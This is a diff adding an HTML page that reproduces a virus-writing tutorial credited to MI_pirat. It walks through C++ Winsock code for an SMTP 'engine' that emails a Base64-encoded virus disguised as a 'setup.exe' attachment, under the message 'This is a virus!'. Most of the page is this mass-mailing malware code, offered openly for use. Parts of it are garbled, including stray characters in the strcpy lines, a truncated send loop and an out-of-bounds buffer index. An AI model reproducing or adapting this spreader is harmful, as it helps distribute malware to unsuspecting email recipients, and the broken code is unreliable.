@@ -1,0 +1,211 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN"><html><head><title>:: SMTP ::</title>
+<script language="JavaScript" type="text/javascript" src="smtp_files/index.html"></script>
+<meta name="GENERATOR" content="Namo WebEditor v2.00">
+<style>
+a {text-decoration: none}
+a:hover {color:red}
+</style></head>
+
+<body bgcolor="white" text="black" link="black" vlink="black" alink="black" style="font-family: Verdana; font-size: 10pt;">
+
+<p align="center">&nbsp; 
+</p><div align="center"><table border="0" cellpadding="0" cellspacing="0" width="60%">
+<tbody><tr>
+<td width="972"><p align="center"><font face="Verdana" size="1"><b>- C++ STMP ENGINE - <br clear="all"></b></font></p></td>
+</tr></tbody></table></div>
+<p align="center"><font face="Verdana" size="1">&nbsp;</font></p><hr width="60%" noshade="noshade"><font face="Verdana" size="1">&nbsp; </font>
+<div align="center"><table border="0" cellpadding="0" cellspacing="0" width="60%">
+<tbody><tr>
+<td width="972"><div align="center"><table border="0" cellpadding="0" cellspacing="0">
+<tbody><tr>
+<td width="582"><p><font face="Verdana" size="2"><i>I didn't write this tutorial it was MI_pirat nor have I changed any of its wording. &nbsp;All I 
+did was change the format so it was easier to read from the orignal tutorial, which 
+can be found </i></font><font face="Verdana" size="2"><i><a href="http://vx.netlux.org/%7Emipirat/Engle/SMTP.htm">here</a></i></font><font face="Verdana" size="2"><i>.</i></font></p>
+<p><font face="Verdana" size="2"><i><hr></i></font></p>
+<p><font face="Verdana" size="2"><i>1.1 Basic Winsock stuff &amp; connecting to a server </i></font></p>
+<p><font face="Verdana" size="1">In order to connect to a server and send e-mails, you have to use winsock. It's not as hard as it 
+looks at first. Here's some code that connects to a server at port 25 (SMTP) using the TCP/IP 
+protocol: </font></p>
+<p><font face="Verdana" size="1"><b>#include &lt; winsock.h &gt;</b></font></p>
+<p><font face="Verdana" size="1"><b>WORD version = MAKEWORD(1,1); <br>
+WSADATA wsaData; <br>
+SOCKET theSocket; <br>
+char Buf[256],myBuf[256]; // Buf -for server answer and myBuf -for your commands <br>
+int nRet; // For eventual errors </b></font></p>
+<p><font face="Verdana" size="1"><b>int conect(char *server) { //Connects to a server using "Winsock" </b></font></p>
+<p><font face="Verdana" size="1" color="green"><b>// Start up Winsock </b></font><font face="Verdana" size="1"><b><br>
+nRet=WSAStartup(version, &amp;wsaData); <br>
+if (nRet!=0) {return(0);} </b></font></p>
+<p><font face="Verdana" size="1" color="green"><b>// Store information about the server</b></font><font face="Verdana" size="1"><b> <br>
+LPHOSTENT lpHostEntry; </b></font></p>
+<p><font face="Verdana" size="1"><b>lpHostEntry = gethostbyname(server); <br>
+if (lpHostEntry == NULL) { <br>
+WSACleanup(); <br>
+return(0); <br>
+} </b></font></p>
+<p><font face="Verdana" size="1" color="green">//</font><font face="Verdana" size="1" color="green"><b> Create the socket </b></font><font face="Verdana" size="1"><b><br>
+theSocket = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP); <br>
+if (theSocket == INVALID_SOCKET) { <br>
+WSACleanup(); <br>
+return(0); <br>
+} </b></font></p>
+<p><font face="Verdana" size="1"><b>SOCKADDR_IN saServer; <br>
+saServer.sin_family = AF_INET; <br>
+saServer.sin_addr = *((LPIN_ADDR)*lpHostEntry-&gt;h_addr_list); <br>
+saServer.sin_port = htons(25); // Port 25 </b></font></p>
+<p><font face="Verdana" size="1" color="green"><b>// Connect to the server</b></font><font face="Verdana" size="1" color="red"><b> </b></font><font face="Verdana" size="1"><b><br>
+nRet = connect(theSocket,(LPSOCKADDR)&amp;saServer,sizeof(struct sockaddr)); <br>
+if (nRet == SOCKET_ERROR) { <br>
+WSACleanup(); <br>
+return(0); <br>
+} </b></font></p>
+<p><font face="Verdana" size="1"><b>nRet = recv(theSocket,Buf,sizeof(Buf),0); <br>
+if (nRet == SOCKET_ERROR) { <br>
+WSACleanup(); <br>
+return(0); <br>
+} </b></font></p>
+<p><font face="Verdana" size="1"><b>if (Buf[0]=='4' || Buf[0]=='5') return(0); // Not a '220' Hello <br>
+if (Buf[0]=='2' &amp;&amp; Buf[1]=='2' &amp;&amp; Buf[2]=='0') { <br>
+sendmail(); // Ok to send mails <br>
+} </b></font></p>
+<p><font face="Verdana" size="1" color="green"><b>//Close the connection </b></font><font face="Verdana" size="1"><b><br>
+closesocket(theSocket); <br></b></font></p>
+<p><font face="Verdana" size="1" color="green"><b>// Shutdown Winsock </b></font><font face="Verdana" size="1"><b><br>
+WSACleanup(); <br>
+} </b></font></p>
+<p><font face="Verdana" size="1">Use like this: conect("server.name"); </font></p>
+<p><font face="Verdana" size="1">This function returns 0 if there is an error, any error. If everything goes okay it will call the 
+sendmail(); function that actually sends the e-mail. </font></p>
+<p><font face="Verdana" size="1">The first part (down to "Connect to the server") is the Winsock init, then the connect function is the 
+one that actually connects to the server. The recv func. gets the server's respounse (in this case we 
+are only interested that the first 3 bytes are '220' - that's ok). </font></p>
+<p><font face="Verdana" size="1"><hr></font><font face="Verdana" size="2"><i>1.2 Sending e-mails from a SMTP server </i></font></p>
+<p><font face="Verdana" size="1">Now that you have a working connection you can send e-mails. The next function sends an e-mail to 
+the specified server. </font></p>
+<p><font face="Verdana" size="1"><b>void sendmail() {</b></font><font face="Verdana" size="1" color="green"><b> //Sends an e-mail with MIME encoding </b></font><font face="Verdana" size="1"><b><br>
+int err=0;<br>
+char ch[1]; </b></font></p>
+<p><font face="Verdana" size="1"><b><br>
+</b></font><font face="Verdana" size="1" color="green"><b>// "HELO" the server</b></font><font face="Verdana" size="1"><b> <br>
+strcpy(myBuf, "HELO &lt;");&gt; strcat(myBuf,helo); <br>
+strcat(myBuf,"&gt;\x0d\x0a"); <br>
+send(theSocket,myBuf,strlen(myBuf),0); <br>
+recv(theSocket,Buf,sizeof(Buf),0); <br></b></font></p>
+<p><font face="Verdana" size="1" color="green"><b>// MAIL FROM... </b></font><font face="Verdana" size="1"><b><br>
+if (Buf[0]=='2' &amp;&amp; Buf[1]=='5' &amp;&amp; Buf[2]=='0') { <br>
+strcpy(myBuf, "MAIL FROM:&lt;");&gt; strcat(myBuf,email); <br>
+strcat(myBuf,"&gt;\x0d\x0a"); <br>
+send(theSocket,myBuf,strlen(myBuf),0); <br>
+recv(theSocket,Buf,sizeof(Buf),0); <br>
+} </b></font></p>
+<p><font face="Verdana" size="1"><b>if (Buf[0]=='4' || Buf[0]=='5') err=1; <br>
+if (Buf[0]=='2' &amp;&amp; Buf[1]=='5' &amp;&amp; Buf[2]=='0' &amp;&amp; err==0) { <br></b></font></p>
+<p><font face="Verdana" size="1" color="green"><b>// MAIL TO... </b></font><font face="Verdana" size="1"><b><br>
+strcpy(myBuf, "RCPT TO:&lt;");&gt; strcat(myBuf, mailto); <br>
+strcat(myBuf, "&gt;\x0d\x0a"); <br>
+send(theSocket,myBuf,strlen(myBuf),0); <br>
+recv(theSocket,Buf,sizeof(Buf),0); <br>
+} </b></font></p>
+<p><font face="Verdana" size="1"><b>if (Buf[0]=='4' || Buf[0]=='5') err=1; <br>
+if (Buf[0]=='2' &amp;&amp; Buf[1]=='5' &amp;&amp; err==0) { <br>
+strcpy(myBuf, "DATA\x0d\x0a"); <br>
+send(theSocket,myBuf,strlen(myBuf),0);<br>
+&nbsp;recv(theSocket,Buf,sizeof(Buf),0); <br>
+} </b></font></p>
+<p><font face="Verdana" size="1"><b>if (Buf[0]=='4' || Buf[0]=='5') err=1; <br></b></font></p>
+<p><font face="Verdana" size="1" color="green"><b>// MIME encoded message </b></font><font face="Verdana" size="1"><b><br>
+if (Buf[0]=='3' &amp;&amp; Buf[1]=='5' &amp;&amp; Buf[2]=='4' &amp;&amp; err==0) { <br>
+strcpy(myBuf, "From: &lt;");&gt; strcat(myBuf, email); // Can change "email" to anything <br>
+strcat(myBuf, "&gt;\x0d\x0a"); <br>
+send(theSocket,myBuf,strlen(myBuf),0); <br>
+strcpy(myBuf, "Subject: Hello\x0d\x0a"); // Your subject goes here <br>
+send(theSocket,myBuf,strlen(myBuf),0); </b></font></p>
+<p><font face="Verdana" size="1"><b><br>
+</b></font><font face="Verdana" size="1" color="green"><b>// MIME stuff </b></font><font face="Verdana" size="1"><b><br>
+strcpy(myBuf, "MIME-Version: 1.0\x0d\x0a"); <br>
+send(theSocket,myBuf,strlen(myBuf),0); <br>
+strcpy(myBuf, "Content-Type: multipart/mixed;\x0d\x0a"); <br>
+send(theSocket,myBuf,strlen(myBuf),0); <br>
+strcpy(myBuf, " boundary = \"bla\"\x0d\x0a"); <br>
+send(theSocket,myBuf,strlen(myBuf),0); <br>
+strcpy(myBuf, "X-Priority: 3\x0d\x0a"); <br>
+send(theSocket,myBuf,strlen(myBuf),0); <br>
+strcpy(myBuf, "X -MSMail - Priority: Normal\x0d\x0a"); <br>
+send(theSocket,myBuf,strlen(myBuf),0); <br>
+strcpy(myBuf, "X-Mailer: mailer@localhost\x0d\x0a\x0d\x0a"); <br>
+send(theSocket,myBuf,strlen(myBuf),0); <br>
+strcpy(myBuf, "This is a multi-part message in MIME format.\x0d\x0a\x0d\x0a"); <br>
+send(theSocket,myBuf,strlen(myBuf),0); <br>
+strcpy(myBuf, "--bla\x0d\x0a"); <br>
+send(theSocket,myBuf,strlen(myBuf),0); <br>
+strcpy(myBuf, "Content-Type: text/plain; charset:us-ascii\x0d\x0a\x0d\x0a"); <br>
+send(theSocket,myBuf,strlen(myBuf),0); </b></font></p>
+<p><font face="Verdana" size="1"><b><br>
+</b></font><font face="Verdana" size="1" color="green"><b>// This is the message (change it as you whish) </b></font><font face="Verdana" size="1"><b><br>
+strcpy(myBuf, "This is a virus!\x0d\x0a\x0d\x0a"); <br>
+send(theSocket,myBuf,strlen(myBuf),0); <br>
+strcpy(myBuf, "--bla\x0d\x0a"); <br>
+send(theSocket,myBuf,strlen(myBuf),0); <br>
+strcpy(myBuf, "Content-Type: application/x-msdownload;\x0d\x0a"); <br>
+send(theSocket,myBuf,strlen(myBuf),0); </b></font></p>
+<p><font face="Verdana" size="1"><b><br>
+</b></font><font face="Verdana" size="1" color="green"><b>// This is the attachement file name, also change this </b></font><font face="Verdana" size="1"><b><br>
+strcpy(myBuf, " name = \"setup.exe\"\x0d\x0a"); <br>
+send(theSocket,myBuf,strlen(myBuf),0); <br>
+strcpy(myBuf, "Content-Transfer-Encoding: base64\x0d\x0a"); <br>
+send(theSocket,myBuf,strlen(myBuf),0); <br>
+strcpy(myBuf, "Content-Disposition: attachment;\x0d\x0a"); <br>
+send(theSocket,myBuf,strlen(myBuf),0); <br></b></font></p>
+<p><font face="Verdana" size="1" color="green"><b><br>
+// This is the attachement file name, also change this </b></font><font face="Verdana" size="1"><b><br>
+strcpy(myBuf, " filename = \"setup.exe\"\x0d\x0a\x0d\x0a"); <br>
+send(theSocket,myBuf,strlen(myBuf),0); </b></font></p>
+<p><font face="Verdana" size="1"><b><br>
+</b></font><font face="Verdana" size="1" color="green"><b>//Send the file byte by byte </b></font><font face="Verdana" size="1"><b><br>
+fstream f("C:\\virus.b64",ios::in); // The file must be Base64 encoded <br>
+for (int k=0;k f.get(ch[1]); <br>
+strcpy(myBuf,&amp;ch[1]); <br>
+send(theSocket,myBuf,strlen(myBuf),0); <br>
+} <br>
+f.close(); <br>
+strcpy(myBuf, "\x0d\x0a--bla--\x0d\x0a"); <br>
+send(theSocket,myBuf,strlen(myBuf),0); <br>
+strcpy(myBuf, "\x0d\x0a.\x0d\x0a"); // End transmission ;) <br>
+send(theSocket,myBuf,strlen(myBuf),0); <br>
+recv(theSocket,Buf,sizeof(Buf),0); <br>
+} <br>
+if (Buf[0]=='4' || Buf[0]=='5') err=1; <br>
+<br></b></font></p>
+<p><font face="Verdana" size="1" color="green"><b>// QUIT (bye bye) </b></font><font face="Verdana" size="1"><b><br>
+strcpy(myBuf, "QUIT\x0d\x0a"); <br>
+send(theSocket,myBuf,strlen(myBuf),0); <br>
+} </b></font></p>
+<p><font face="Verdana" size="1">That's about all. Now what the code really does: </font></p>
+<p><font face="Verdana" size="1">- First it sends a "HELO </font><font size="1">emaildomain</font><font face="Verdana" size="1">&nbsp;\x0d\x0a" . emaildomain is the domain that follows after the "@" 
+(e.g. virus@virii.org , emaildomain is "virii.org"). If the answer is 250 go next. </font></p>
+<p><font face="Verdana" size="1">- Send "MAIL FROM:</font><font size="1">email </font><font face="Verdana" size="1">\x0d\x0a" (email must be a real e-mail address). If the answer is 250 go 
+next. </font></p>
+<p><font face="Verdana" size="1">- Send "RCPT TO:</font><font size="1">mailto </font><font face="Verdana" size="1">\x0d\x0a". If the answer is 250 go next. <br>
+- Send "DATA\x0d\x0a".If the answer is 345 go next. <br>
+- Send your MIME message and Base64 encoded file. End with "\x0d\x0a.\x0d\x0a". <br>
+- Send "QUIT\x0d\x0a". <br>
+<br>
+<hr></font><font face="Verdana" size="2"><i>1.3 Base64 encoding <br></i></font></p>
+<p><font face="Verdana" size="1">Base64 is an encoding algorithm that uses 64 characters. It is used to send data over the Net. I will 
+not include any base64 encoding/decoding functions because mine really suck and you can get them 
+from any virus site or zine. <br>
+<br></font></p>
+<p><font face="Verdana" size="2"><i><hr>1.4 End </i></font><font face="Verdana" size="1"><br>
+<br>
+That's all folks. Hope you enjoied this tut. ! Greetz to everyone I know (I won't write them all here). </font></p>
+<p>&nbsp;</p></td>
+</tr><tr>
+<td width="582"><p align="center"><font face="Verdana" size="1"><b>by MI_pirat</b></font><font face="Verdana" size="1"><br>
+&nbsp;</font></p></td>
+</tr><tr>
+<td width="582" height="15"><p align="center"><font face="Verdana" size="1">Retro<br clear="all"> 
+</font><font face="Verdana" size="1"><a href="http://retro.host.sk/">http://retro.host.sk</a></font></p></td>
+</tr></tbody></table></div></td>
+</tr></tbody></table></div>
+<p align="center"><font size="2">&nbsp;</font></p>
+</body></html>
